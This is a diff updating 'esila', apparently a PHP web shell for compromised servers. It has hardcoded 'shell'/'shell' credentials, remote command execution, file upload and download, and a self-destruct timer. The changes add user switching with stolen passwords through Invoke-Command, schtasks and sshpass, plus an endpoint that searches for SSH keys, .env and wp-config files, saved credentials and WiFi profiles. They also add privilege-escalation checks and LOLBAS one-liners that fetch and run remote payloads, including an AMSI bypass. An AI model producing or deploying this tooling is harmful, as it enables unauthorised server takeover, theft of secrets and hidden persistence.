@@ -6,6 +6,7 @@ error_reporting(0);
 if (!function_exists('str_contains')) { function str_contains($h,$n){return $n===''||strpos($h,$n)!==false;} }
 if (!function_exists('str_starts_with')) { function str_starts_with($h,$n){return $n===''||strncmp($h,$n,strlen($n))===0;} }
 if (!function_exists('array_key_first')) { function array_key_first($a){foreach($a as $k=>$v)return $k;return null;} }
+if (!function_exists('random_int')) { function random_int($min,$max){return mt_rand($min,$max);} }
 
 // Session hardening - Windows IIS often has broken session save path
 if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
@@ -21,7 +22,7 @@ if(!isset($_SESSION)){$_SESSION=array();}
 define('IS_WIN', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
 define('DEFAULT_USER', 'shell');
 define('DEFAULT_PASS', 'shell');
-define('VERSION', '2.4');
+define('VERSION', '2.5');
 
 // PowerShell-safe single-quote escaping for .ps1 scripts
 function ps_quote($s) { return "'" . str_replace("'", "''", $s) . "'"; }
@@ -49,8 +50,15 @@ function esila_exec($cmd) {
     return ($out !== null && $out !== false) ? $out : '';
 }
 
+// Auth helper for pre-login endpoints
+function esila_auth_ok() {
+    return (isset($_SESSION['logged_in']) && $_SESSION['logged_in'])
+        || (isset($_COOKIE['esila_auth']) && $_COOKIE['esila_auth'] === md5(DEFAULT_USER . ':' . DEFAULT_PASS));
+}
+
 // .htaccess fix endpoint
 if (isset($_POST['action']) && $_POST['action'] === 'fix_htaccess') {
+    if (!esila_auth_ok()) { http_response_code(403); exit; }
     header('Content-Type: application/json');
     $dir = dirname(__FILE__);
     $mode = isset($_POST['mode']) ? $_POST['mode'] : 'module';
@@ -66,6 +74,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'fix_htaccess') {
 
 // Self-destruct
 if (isset($_POST['action']) && $_POST['action'] === 'self_destruct') {
+    if (!esila_auth_ok()) { http_response_code(403); exit; }
     header('Content-Type: application/json');
     $minutes = intval(isset($_POST['minutes']) ? $_POST['minutes'] : 0);
     if ($minutes > 0 && $minutes <= 1440) {
@@ -77,19 +86,23 @@ if (isset($_POST['action']) && $_POST['action'] === 'self_destruct') {
         } else {
             esila_exec("nohup bash -c 'sleep $delay && rm -f " . escapeshellarg($self) . "' >/dev/null 2>&1 &");
         }
-        echo json_encode(['ok' => true, 'msg' => "Self destruct in $minutes minutes"]);
+        echo json_encode(array('ok' => true, 'msg' => "Self destruct in $minutes minutes"));
     } else {
-        echo json_encode(['ok' => false, 'msg' => 'Invalid minutes (1-1440)']);
+        echo json_encode(array('ok' => false, 'msg' => 'Invalid minutes (1-1440)'));
     }
     exit;
 }
 
-// Download handler
+// Download handler (requires auth)
 if (isset($_GET['download'])) {
+    if (!isset($_SESSION['logged_in']) && !(isset($_COOKIE['esila_auth']) && $_COOKIE['esila_auth'] === md5(DEFAULT_USER . ':' . DEFAULT_PASS))) {
+        http_response_code(403); exit;
+    }
     $f = $_GET['download'];
     if (is_file($f) && is_readable($f)) {
+        $bn = basename($f);
         header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
+        header('Content-Disposition: attachment; filename="' . str_replace('"', '_', $bn) . '"');
         header('Content-Length: ' . filesize($f));
         readfile($f);
     }
@@ -194,7 +207,7 @@ function fixHtaccess(mode) {
 
 // Authenticated API endpoints
 if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd() ?: (IS_WIN ? 'C:\\' : '/');
-if (!isset($_SESSION['history'])) $_SESSION['history'] = [];
+if (!isset($_SESSION['history'])) $_SESSION['history'] = array();
 $cwd = $_SESSION['cwd'];
 
 // Logout
@@ -224,7 +237,7 @@ if (isset($_POST['autocomplete'])) {
         }
         if (!$dir || !is_dir($dir)) exit;
     }
-    $results = [];
+    $results = array();
     foreach (@scandir($dir) as $entry) {
         if ($entry === '.' || $entry === '..') continue;
         if (str_starts_with(strtolower($entry), strtolower($partial))) {
@@ -251,22 +264,61 @@ if (isset($_POST['action']) && $_POST['action'] === 'switch_user') {
         $rid = mt_rand(10000,99999);
         $tmpf = $tmp . '\\esila_su_' . $rid . '.txt';
         $ps1 = $tmp . '\\esila_su_' . $rid . '.ps1';
-        $ps_script = '$p = ConvertTo-SecureString ' . ps_quote($su_pass) . " -AsPlainText -Force\r\n"
+        $ps_script = '$ErrorActionPreference = "Stop"' . "\r\n"
+            . '$o = ' . ps_quote($tmpf) . "\r\n"
+            . '$p = ConvertTo-SecureString ' . ps_quote($su_pass) . " -AsPlainText -Force\r\n"
             . '$c = New-Object System.Management.Automation.PSCredential(' . ps_quote($su_user) . ", \$p)\r\n"
-            . 'Start-Process cmd -Credential $c -ArgumentList "/c whoami" -NoNewWindow -Wait -RedirectStandardOutput ' . ps_quote($tmpf) . "\r\n"
-            . 'Get-Content ' . ps_quote($tmpf) . "\r\n"
-            . 'Remove-Item ' . ps_quote($tmpf) . ', ' . ps_quote($ps1) . " -Force -ErrorAction SilentlyContinue\r\n";
+            . "\$ok = \$false\r\n"
+            . "foreach (\$h in @('.', 'localhost', \$env:COMPUTERNAME)) {\r\n"
+            . "  try {\r\n"
+            . "    \$r = Invoke-Command -ComputerName \$h -Credential \$c -ScriptBlock { whoami } -ErrorAction Stop 2>&1\r\n"
+            . "    Write-Output \$r; \$ok = \$true; break\r\n"
+            . "  } catch { }\r\n"
+            . "}\r\n"
+            . "if (-not \$ok) {\r\n"
+            . "  try {\r\n"
+            . '    Start-Process cmd -Credential $c -ArgumentList "/c whoami > $o" -NoNewWindow -Wait -ErrorAction Stop' . "\r\n"
+            . "    Get-Content \$o; \$ok = \$true\r\n"
+            . "  } catch { }\r\n"
+            . "}\r\n"
+            . "if (-not \$ok) {\r\n"
+            . "  \$tn = 'esila_' + " . ps_quote((string)$rid) . "\r\n"
+            . "  try {\r\n"
+            . '    schtasks /create /tn $tn /tr ("cmd /c whoami > " + $o) /sc once /st 00:00 /ru ' . ps_quote($su_user) . ' /rp ' . ps_quote($su_pass) . " /f 2>&1 | Out-Null\r\n"
+            . "    schtasks /run /tn \$tn 2>&1 | Out-Null\r\n"
+            . "    Start-Sleep -Seconds 2\r\n"
+            . "    schtasks /delete /tn \$tn /f 2>&1 | Out-Null\r\n"
+            . "    if (Test-Path \$o) { Get-Content \$o; \$ok = \$true }\r\n"
+            . "  } catch { }\r\n"
+            . "}\r\n"
+            . "if (-not \$ok) { Write-Output 'All methods failed. Try: WinRM not enabled, or account locked.' }\r\n"
+            . "Remove-Item \$o -Force -ErrorAction SilentlyContinue\r\n"
+            . 'Remove-Item ' . ps_quote($ps1) . " -Force -ErrorAction SilentlyContinue\r\n";
         @file_put_contents($ps1, $ps_script);
         $test = esila_exec('powershell -ExecutionPolicy Bypass -File ' . escapeshellarg($ps1) . ' 2>&1');
         @unlink($ps1);
     } else {
-        $test = esila_exec('echo ' . escapeshellarg($su_pass) . ' | su - ' . escapeshellarg($su_user) . ' -c "whoami" 2>&1');
-        if (strpos($test, $su_user) === false) {
-            $test = esila_exec('echo ' . escapeshellarg($su_pass) . ' | sudo -S -u ' . escapeshellarg($su_user) . ' whoami 2>&1');
+        $test = esila_exec('echo ' . escapeshellarg($su_pass) . ' | sudo -S -u ' . escapeshellarg($su_user) . ' whoami 2>&1');
+        if (strpos($test, $su_user) === false && strpos(strtolower($test), strtolower($su_user)) === false) {
+            $test = esila_exec('echo ' . escapeshellarg($su_pass) . ' | su - ' . escapeshellarg($su_user) . ' -c "whoami" 2>&1');
+        }
+        if (strpos($test, $su_user) === false && strpos(strtolower($test), strtolower($su_user)) === false) {
+            $test = esila_exec('sshpass -p ' . escapeshellarg($su_pass) . ' ssh -o StrictHostKeyChecking=no ' . escapeshellarg($su_user) . '@localhost whoami 2>&1');
         }
     }
     $test = trim($test);
-    if (strpos($test, $su_user) !== false || strpos($test, strtolower($su_user)) !== false) {
+    $test_lines = explode("\n", $test);
+    $test_last = strtolower(trim(end($test_lines)));
+    $su_check = strtolower($su_user);
+    if (strpos($su_check, '\\') !== false) $su_check = substr($su_check, strrpos($su_check, '\\') + 1);
+    $matched = false;
+    foreach ($test_lines as $tl) {
+        $tl = strtolower(trim($tl));
+        if ($tl === $su_check || (strpos($tl, '\\') !== false && substr($tl, strrpos($tl, '\\') + 1) === $su_check)) {
+            $matched = true; break;
+        }
+    }
+    if ($matched) {
         $_SESSION['su_user'] = $su_user;
         $_SESSION['su_pass'] = $su_pass;
         echo json_encode(array('ok' => true, 'msg' => 'Switched to ' . $su_user, 'user' => $su_user));
@@ -309,12 +361,42 @@ if (isset($_POST['cmd'])) {
             $outf = $tmp . '\\esila_o' . $r . '.txt';
             $errf = $tmp . '\\esila_e' . $r . '.txt';
             $ps1 = $tmp . '\\esila_r' . $r . '.ps1';
-            $cmd_esc = str_replace('"', '`"', $basecmd);
-            $ps_script = '$p = ConvertTo-SecureString ' . ps_quote($su_pass) . " -AsPlainText -Force\r\n"
+            $ps_script = '$ErrorActionPreference = "Stop"' . "\r\n"
+                . '$o = ' . ps_quote($outf) . "\r\n"
+                . '$e = ' . ps_quote($errf) . "\r\n"
+                . '$p = ConvertTo-SecureString ' . ps_quote($su_pass) . " -AsPlainText -Force\r\n"
                 . '$c = New-Object System.Management.Automation.PSCredential(' . ps_quote($su_user) . ", \$p)\r\n"
-                . 'Start-Process cmd -Credential $c -ArgumentList "/c ' . $cmd_esc . '" -NoNewWindow -Wait -RedirectStandardOutput ' . ps_quote($outf) . ' -RedirectStandardError ' . ps_quote($errf) . "\r\n"
-                . 'Get-Content ' . ps_quote($outf) . ', ' . ps_quote($errf) . "\r\n"
-                . 'Remove-Item ' . ps_quote($outf) . ', ' . ps_quote($errf) . ', ' . ps_quote($ps1) . " -Force -ErrorAction SilentlyContinue\r\n";
+                . "\$cmd = " . ps_quote($basecmd) . "\r\n"
+                . "\$ok = \$false\r\n"
+                . "foreach (\$h in @('.', 'localhost', \$env:COMPUTERNAME)) {\r\n"
+                . "  try {\r\n"
+                . "    Invoke-Command -ComputerName \$h -Credential \$c -ScriptBlock { param(\$x) cmd /c \$x } -ArgumentList \$cmd -ErrorAction Stop\r\n"
+                . "    \$ok = \$true; break\r\n"
+                . "  } catch { }\r\n"
+                . "}\r\n"
+                . "if (-not \$ok) {\r\n"
+                . "  try {\r\n"
+                . '    Start-Process cmd -Credential $c -ArgumentList ("/c " + $cmd + " > " + $o + " 2> " + $e) -NoNewWindow -Wait -ErrorAction Stop' . "\r\n"
+                . "    if (Test-Path \$o) { Get-Content \$o }\r\n"
+                . "    if (Test-Path \$e) { Get-Content \$e }\r\n"
+                . "    \$ok = \$true\r\n"
+                . "  } catch { }\r\n"
+                . "}\r\n"
+                . "if (-not \$ok) {\r\n"
+                . "  \$tn = 'esila_' + " . ps_quote((string)$r) . "\r\n"
+                . "  try {\r\n"
+                . '    schtasks /create /tn $tn /tr ("cmd /c " + $cmd + " > " + $o + " 2> " + $e) /sc once /st 00:00 /ru ' . ps_quote($su_user) . ' /rp ' . ps_quote($su_pass) . " /f 2>&1 | Out-Null\r\n"
+                . "    schtasks /run /tn \$tn 2>&1 | Out-Null\r\n"
+                . "    Start-Sleep -Seconds 3\r\n"
+                . "    schtasks /delete /tn \$tn /f 2>&1 | Out-Null\r\n"
+                . "    if (Test-Path \$o) { Get-Content \$o }\r\n"
+                . "    if (Test-Path \$e) { Get-Content \$e }\r\n"
+                . "    \$ok = \$true\r\n"
+                . "  } catch { }\r\n"
+                . "}\r\n"
+                . "if (-not \$ok) { Write-Output 'All methods failed (Invoke-Command, Start-Process, schtasks)' }\r\n"
+                . "Remove-Item \$o, \$e -Force -ErrorAction SilentlyContinue\r\n"
+                . 'Remove-Item ' . ps_quote($ps1) . " -Force -ErrorAction SilentlyContinue\r\n";
             @file_put_contents($ps1, $ps_script);
             $exec = 'powershell -ExecutionPolicy Bypass -File ' . escapeshellarg($ps1) . ' 2>&1';
         } else {
@@ -330,8 +412,10 @@ if (isset($_POST['cmd'])) {
 // Upload
 if (isset($_FILES['upload'])) {
     header('Content-Type: application/json');
-    $dest = (isset($_POST['upload_path']) ? $_POST['upload_path'] : $cwd) . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
-    echo json_encode(['ok' => move_uploaded_file($_FILES['upload']['tmp_name'], $dest), 'name' => basename($dest)]);
+    $up_dir = isset($_POST['upload_path']) ? $_POST['upload_path'] : $cwd;
+    if (!is_dir($up_dir)) $up_dir = $cwd;
+    $dest = $up_dir . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
+    echo json_encode(array('ok' => move_uploaded_file($_FILES['upload']['tmp_name'], $dest), 'name' => basename($dest)));
     exit;
 }
 
@@ -339,14 +423,14 @@ if (isset($_FILES['upload'])) {
 if (isset($_POST['action']) && $_POST['action'] === 'filemanager') {
     header('Content-Type: application/json');
     $path = isset($_POST['path']) ? $_POST['path'] : $cwd;
-    if (!is_dir($path)) { echo json_encode(['error' => 'Not a directory']); exit; }
-    $items = [];
+    if (!is_dir($path)) { echo json_encode(array('error' => 'Not a directory')); exit; }
+    $items = array();
     foreach (@scandir($path) as $f) {
         if ($f === '.') continue;
         $fp = $path . DIRECTORY_SEPARATOR . $f;
         $stat = @stat($fp);
         $perms = IS_WIN ? ((is_readable($fp) ? 'R' : '-') . (is_writable($fp) ? 'W' : '-') . (is_executable($fp) ? 'X' : '-')) : substr(sprintf('%o', @fileperms($fp)), -4);
-        $items[] = [
+        $items[] = array(
             'name' => $f,
             'path' => realpath($fp) ?: $fp,
             'is_dir' => is_dir($fp),
@@ -355,9 +439,9 @@ if (isset($_POST['action']) && $_POST['action'] === 'filemanager') {
             'mtime' => $stat ? date('Y-m-d H:i', $stat['mtime']) : '',
             'readable' => is_readable($fp),
             'writable' => is_writable($fp),
-        ];
+        );
     }
-    echo json_encode(['path' => realpath($path), 'items' => $items]);
+    echo json_encode(array('path' => realpath($path), 'items' => $items));
     exit;
 }
 
@@ -368,22 +452,35 @@ if (isset($_POST['action']) && $_POST['action'] === 'fileaction') {
     $path = isset($_POST['path']) ? $_POST['path'] : '';
     switch ($type) {
         case 'delete':
-            echo json_encode(['ok' => is_dir($path) ? @rmdir($path) : @unlink($path)]);
+            if (is_dir($path)) {
+                $dh = @opendir($path);
+                $empty = true;
+                if ($dh) { while (($e = readdir($dh)) !== false) { if ($e !== '.' && $e !== '..') { $empty = false; break; } } closedir($dh); }
+                echo json_encode(array('ok' => $empty ? @rmdir($path) : false, 'msg' => $empty ? '' : 'Directory not empty'));
+            } else {
+                echo json_encode(array('ok' => @unlink($path)));
+            }
             break;
         case 'rename':
-            echo json_encode(['ok' => @rename($path, dirname($path) . DIRECTORY_SEPARATOR . basename(isset($_POST['newname']) ? $_POST['newname'] : ''))]);
+            echo json_encode(array('ok' => @rename($path, dirname($path) . DIRECTORY_SEPARATOR . basename(isset($_POST['newname']) ? $_POST['newname'] : ''))));
             break;
         case 'chmod':
-            echo json_encode(['ok' => @chmod($path, octdec(isset($_POST['mode']) ? $_POST['mode'] : '0644'))]);
+            echo json_encode(array('ok' => @chmod($path, octdec(isset($_POST['mode']) ? $_POST['mode'] : '0644'))));
             break;
         case 'read':
-            echo json_encode(['content' => @file_get_contents($path)]);
+            $sz = @filesize($path);
+            if ($sz !== false && $sz > 2097152) {
+                echo json_encode(array('content' => '[File too large to edit: ' . round($sz/1048576, 1) . ' MB. Use download instead.]'));
+            } else {
+                $fc = @file_get_contents($path);
+                echo json_encode(array('content' => ($fc !== false ? $fc : '[Cannot read file: permission denied or file not found]')));
+            }
             break;
         case 'write':
-            echo json_encode(['ok' => @file_put_contents($path, isset($_POST['content']) ? $_POST['content'] : '') !== false]);
+            echo json_encode(array('ok' => @file_put_contents($path, isset($_POST['content']) ? $_POST['content'] : '') !== false));
             break;
         case 'mkdir':
-            echo json_encode(['ok' => @mkdir($path, 0755, true)]);
+            echo json_encode(array('ok' => @mkdir($path, 0755, true)));
             break;
     }
     exit;
@@ -393,7 +490,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'fileaction') {
 if (isset($_POST['action']) && $_POST['action'] === 'sysinfo') {
     header('Content-Type: application/json');
     if (IS_WIN) {
-        $info = [
+        $info = array(
             'os' => php_uname(),
             'kernel' => php_uname('r'),
             'hostname' => gethostname(),
@@ -411,19 +508,19 @@ if (isset($_POST['action']) && $_POST['action'] === 'sysinfo') {
             'php_ver' => phpversion(),
             'php_disabled' => ini_get('disable_functions'),
             'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'unknown',
-        ];
+        );
     } else {
-        $info = [
+        $info = array(
             'os' => php_uname(),
             'kernel' => php_uname('r'),
             'hostname' => gethostname(),
             'user' => trim(esila_exec('whoami 2>/dev/null')),
             'uid' => trim(esila_exec('id 2>/dev/null')),
             'groups' => trim(esila_exec('groups 2>/dev/null')),
-            'ip_addrs' => trim(esila_exec("hostname -I 2>/dev/null || ifconfig 2>/dev/null | grep 'inet ' | awk '{print \$2}'")),
+            'ip_addrs' => trim(esila_exec("hostname -I 2>/dev/null || ip -4 addr show 2>/dev/null | grep 'inet ' | awk '{print \$2}' || ifconfig 2>/dev/null | grep 'inet ' | awk '{print \$2}'")),
             'uptime' => trim(esila_exec('uptime 2>/dev/null')),
             'disk' => trim(esila_exec('df -h 2>/dev/null')),
-            'interfaces' => trim(esila_exec('ip -br addr 2>/dev/null || ifconfig 2>/dev/null')),
+            'interfaces' => trim(esila_exec('ip -br addr 2>/dev/null || ip addr 2>/dev/null || ifconfig 2>/dev/null')),
             'env' => trim(esila_exec('env 2>/dev/null')),
             'processes' => trim(esila_exec('ps aux --sort=-%mem 2>/dev/null | head -30')),
             'passwd' => @file_get_contents('/etc/passwd'),
@@ -431,7 +528,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'sysinfo') {
             'php_ver' => phpversion(),
             'php_disabled' => ini_get('disable_functions'),
             'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'unknown',
-        ];
+        );
     }
     echo json_encode($info);
     exit;
@@ -444,10 +541,34 @@ if (isset($_POST['action']) && $_POST['action'] === 'find_suid') {
         $out = "=== Current Privileges ===\n" . trim(esila_exec('whoami /priv 2>nul'));
         $out .= "\n\n=== Unquoted Service Paths ===\n" . trim(esila_exec('wmic service get name,displayname,pathname,startmode 2>nul | findstr /I /V "C:\\Windows\\\\" | findstr /I /V """'));
         $out .= "\n\n=== Scheduled Tasks (writable) ===\n" . trim(esila_exec('schtasks /query /fo LIST /V 2>nul | findstr /I "Task To Run"'));
-        echo json_encode(['result' => $out ?: 'No privilege escalation vectors found.']);
+        echo json_encode(array('result' => $out ?: 'No privilege escalation vectors found.'));
     } else {
-        echo json_encode(['result' => trim(esila_exec('find / -perm -4000 -type f 2>/dev/null | head -50'))]);
+        $out = "=== SUID Binaries ===\n" . trim(esila_exec('find / -perm -4000 -type f 2>/dev/null | head -50'));
+        $caps = trim(esila_exec('getcap -r / 2>/dev/null | head -30'));
+        if ($caps) $out .= "\n\n=== Capabilities ===\n" . $caps;
+        $out .= "\n\n=== Writable Cron ===\n" . trim(esila_exec('find /etc/cron* /var/spool/cron -writable -type f 2>/dev/null'));
+        $docker = '';
+        if (file_exists('/.dockerenv')) $docker = 'Running inside Docker container';
+        elseif (@is_readable('/proc/1/cgroup') && strpos(@file_get_contents('/proc/1/cgroup'), 'docker') !== false) $docker = 'Running inside Docker container';
+        if ($docker) $out .= "\n\n=== Container ===\n" . $docker;
+        echo json_encode(array('result' => $out));
     }
+    exit;
+}
+
+// SSH keys & interesting files finder
+if (isset($_POST['action']) && $_POST['action'] === 'find_secrets') {
+    header('Content-Type: application/json');
+    if (IS_WIN) {
+        $out = "=== Saved Credentials ===\n" . trim(esila_exec('cmdkey /list 2>nul'));
+        $out .= "\n\n=== WiFi Passwords ===\n" . trim(esila_exec('netsh wlan show profiles 2>nul'));
+        $out .= "\n\n=== Interesting Files ===\n" . trim(esila_exec('dir /s /b C:\\Users\\*.txt C:\\Users\\*.ini C:\\Users\\*.xml C:\\Users\\*.config 2>nul | findstr /I "pass cred secret token" | head -20 2>nul'));
+    } else {
+        $out = "=== SSH Keys ===\n" . trim(esila_exec('find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "*.pem" -o -name "authorized_keys" 2>/dev/null | head -20'));
+        $out .= "\n\n=== Interesting Files ===\n" . trim(esila_exec('find / -name ".bash_history" -o -name ".mysql_history" -o -name "wp-config.php" -o -name ".env" -o -name ".git-credentials" -o -name ".netrc" -o -name ".pgpass" 2>/dev/null | head -20'));
+        $out .= "\n\n=== Listening Ports ===\n" . trim(esila_exec('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null'));
+    }
+    echo json_encode(array('result' => $out));
     exit;
 }
 
@@ -456,9 +577,9 @@ if (isset($_POST['action']) && $_POST['action'] === 'find_writable') {
     header('Content-Type: application/json');
     if (IS_WIN) {
         $drive = getenv('SystemDrive') ?: 'C:';
-        echo json_encode(['result' => trim(esila_exec('icacls ' . $drive . '\\ /findsid Everyone /T 2>nul | findstr /I "Everyone"'))]);
+        echo json_encode(array('result' => trim(esila_exec('icacls ' . $drive . '\\ /findsid Everyone /T 2>nul | findstr /I "Everyone"'))));
     } else {
-        echo json_encode(['result' => trim(esila_exec('find / -writable -type d 2>/dev/null | head -50'))]);
+        echo json_encode(array('result' => trim(esila_exec('find / -writable -type d 2>/dev/null | head -50'))));
     }
     exit;
 }
@@ -468,7 +589,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'nettool') {
     header('Content-Type: application/json');
     $tool = isset($_POST['tool']) ? $_POST['tool'] : '';
     $target = isset($_POST['target']) ? $_POST['target'] : '';
-    if (!preg_match('/^[a-zA-Z0-9\.\-\:\/]+$/', $target)) { echo json_encode(['result' => 'Invalid target']); exit; }
+    if (!preg_match('/^[a-zA-Z0-9\.\-\:\/\_\~\%]+$/', $target) || strlen($target) > 255) { echo json_encode(array('result' => 'Invalid target')); exit; }
     $out = '';
     $t = escapeshellarg($target);
     switch ($tool) {
@@ -489,15 +610,19 @@ if (isset($_POST['action']) && $_POST['action'] === 'nettool') {
             break;
         case 'dns':
             $out = esila_exec(IS_WIN ? "nslookup $t 2>&1" : "nslookup $t 2>&1 || dig $t 2>&1 || host $t 2>&1");
+            if (empty(trim($out))) {
+                $ip = @gethostbyname($target);
+                $out = ($ip !== $target) ? "$target -> $ip (PHP gethostbyname)" : "Could not resolve. Install dnsutils for full DNS lookups.";
+            }
             break;
         case 'arp':
             $out = esila_exec("arp -a 2>&1");
             break;
         case 'curl':
-            $out = esila_exec(IS_WIN ? "curl -sI $t 2>&1 || powershell -c \"try{(Invoke-WebRequest -Uri $t -Method Head -UseBasicParsing).Headers|Format-List}catch{\\$_.Exception.Message}\" 2>&1" : "curl -sI $t 2>&1");
+            $out = esila_exec(IS_WIN ? "curl -sI --connect-timeout 5 --max-time 10 $t 2>&1 || powershell -c \"try{(Invoke-WebRequest -Uri $t -Method Head -UseBasicParsing -TimeoutSec 10).Headers|Format-List}catch{\\$_.Exception.Message}\" 2>&1" : "curl -sI --connect-timeout 5 --max-time 10 $t 2>&1");
             break;
     }
-    echo json_encode(['result' => $out]);
+    echo json_encode(array('result' => $out));
     exit;
 }
 
@@ -506,7 +631,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'chpass') {
     header('Content-Type: application/json');
     $old = isset($_POST['old_pass']) ? $_POST['old_pass'] : '';
     $new_pass = isset($_POST['new_pass']) ? $_POST['new_pass'] : '';
-    echo json_encode(['ok' => false, 'msg' => 'Password change requires editing the file directly (DEFAULT_USER / DEFAULT_PASS constants)']);
+    echo json_encode(array('ok' => false, 'msg' => 'Password change requires editing the file directly (DEFAULT_USER / DEFAULT_PASS constants)'));
     exit;
 }
 
@@ -740,6 +865,15 @@ body::before { content:''; position:fixed; inset:0; background-image:radial-grad
         <span style="font-size:12px;color:var(--text-dim);font-family:var(--font-mono)"><?= htmlspecialchars($username) ?>@<?= htmlspecialchars($hostname) ?>:<?= htmlspecialchars($cwd) ?></span>
         <span class="spacer"></span>
         <button class="btn btn-sm" onclick="termClear()">Clear</button>
+        <?php if (IS_WIN) { ?>
+        <button class="btn btn-sm" onclick="termExec('whoami /all')" title="Current user info">whoami</button>
+        <button class="btn btn-sm" onclick="termExec('systeminfo')" title="System info">sysinfo</button>
+        <button class="btn btn-sm" onclick="termExec('netstat -ano')" title="Network connections">netstat</button>
+        <?php } else { ?>
+        <button class="btn btn-sm" onclick="termExec('id && whoami')" title="Current user info">id</button>
+        <button class="btn btn-sm" onclick="termExec('uname -a')" title="Kernel info">uname</button>
+        <button class="btn btn-sm" onclick="termExec('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null')" title="Listening ports">ports</button>
+        <?php } ?>
     </div>
     <div id="terminal-container">
         <div id="term-output" onclick="document.getElementById('term-input').focus()"></div>
@@ -782,11 +916,22 @@ body::before { content:''; position:fixed; inset:0; background-image:radial-grad
 <div class="panel" id="panel-gtfobins">
     <div class="panel-header">
         <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
-        <span class="panel-title">GTFOBins</span>
+        <span class="panel-title" id="gtfo-title"><?= IS_WIN ? 'LOLBAS' : 'GTFOBins' ?></span>
         <span class="spacer"></span>
+        <?php if (IS_WIN) { ?>
+        <button class="btn btn-sm" id="lolbas-toggle-gtfo" onclick="gtfoShowLolbas=false;renderGtfoGrid();this.style.borderColor='var(--accent)';document.getElementById('lolbas-toggle-lolbas').style.borderColor='var(--border)'">GTFOBins</button>
+        <button class="btn btn-sm" id="lolbas-toggle-lolbas" style="border-color:var(--accent)" onclick="gtfoShowLolbas=true;renderGtfoGrid();this.style.borderColor='var(--accent)';document.getElementById('lolbas-toggle-gtfo').style.borderColor='var(--border)'">LOLBAS</button>
+        <?php } ?>
         <input class="input input-sm" id="gtfo-search" placeholder="Search binaries..." style="max-width:200px" oninput="filterGtfo()">
         <select class="input input-sm" id="gtfo-filter" style="max-width:130px" onchange="filterGtfo()">
             <option value="all">All</option>
+            <?php if (IS_WIN) { ?>
+            <option value="download">Download</option>
+            <option value="execute">Execute</option>
+            <option value="bypass">Bypass</option>
+            <option value="privesc">Priv Esc</option>
+            <option value="encode">Encode</option>
+            <?php } ?>
             <option value="suid">SUID</option>
             <option value="sudo">Sudo</option>
             <option value="capabilities">Capabilities</option>
@@ -1075,6 +1220,9 @@ termInput.addEventListener('keydown', function(e) {
     } else if (e.key === 'l' && e.ctrlKey) {
         e.preventDefault();
         termOutput.innerHTML = '';
+    } else if (e.key === 'd' && e.ctrlKey) {
+        e.preventDefault();
+        termWriteLine('<span style="color:var(--text-dim)">exit</span>');
     }
 });
 
@@ -1297,6 +1445,33 @@ var GTFO_DATA = [
     {name:'zsh',cats:['sudo','suid'],cmds:{sudo:'sudo zsh',suid:'zsh'}},
 ];
 
+var IS_WIN_CLIENT = <?= json_encode(IS_WIN) ?>;
+var LOLBAS_DATA = [
+    {name:'certutil.exe',cats:['download','encode'],cmds:{download:'certutil -urlcache -split -f http://{ip}:{port}/file C:\\Users\\Public\\file',encode:'certutil -encode input.exe encoded.b64\ncertutil -decode encoded.b64 output.exe'}},
+    {name:'bitsadmin.exe',cats:['download'],cmds:{download:'bitsadmin /transfer job /download /priority high http://{ip}:{port}/file C:\\Users\\Public\\file'}},
+    {name:'mshta.exe',cats:['execute','download'],cmds:{execute:'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(curl http://{ip}:{port}/shell.ps1)"", 0:close")',download:'mshta http://{ip}:{port}/shell.hta'}},
+    {name:'msiexec.exe',cats:['execute'],cmds:{execute:'msiexec /q /i http://{ip}:{port}/shell.msi'}},
+    {name:'regsvr32.exe',cats:['execute'],cmds:{execute:'regsvr32 /s /n /u /i:http://{ip}:{port}/shell.sct scrobj.dll'}},
+    {name:'rundll32.exe',cats:['execute'],cmds:{execute:'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(curl http://{ip}:{port}/shell.ps1)")'}},
+    {name:'cmstp.exe',cats:['execute'],cmds:{execute:'cmstp.exe /ni /s shell.inf'}},
+    {name:'cscript/wscript',cats:['execute'],cmds:{execute:'cscript //nologo shell.vbs\nwscript //nologo shell.js'}},
+    {name:'forfiles.exe',cats:['execute'],cmds:{execute:'forfiles /p C:\\Windows\\System32 /m notepad.exe /c "C:\\Users\\Public\\shell.exe"'}},
+    {name:'InstallUtil.exe',cats:['execute'],cmds:{execute:'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /U shell.exe'}},
+    {name:'MSBuild.exe',cats:['execute'],cmds:{execute:'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe shell.csproj'}},
+    {name:'PowerShell (AMSI)',cats:['bypass'],cmds:{bypass:'[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)'}},
+    {name:'PowerShell (CLM)',cats:['bypass'],cmds:{bypass:'powershell -version 2 -c "whoami"\npowershell -ep bypass -c "\\$ExecutionContext.SessionState.LanguageMode"'}},
+    {name:'icacls.exe',cats:['file-write','privesc'],cmds:{'file-write':'icacls C:\\target /grant Everyone:F',privesc:'icacls "C:\\Program Files\\VulnService" /grant Everyone:F'}},
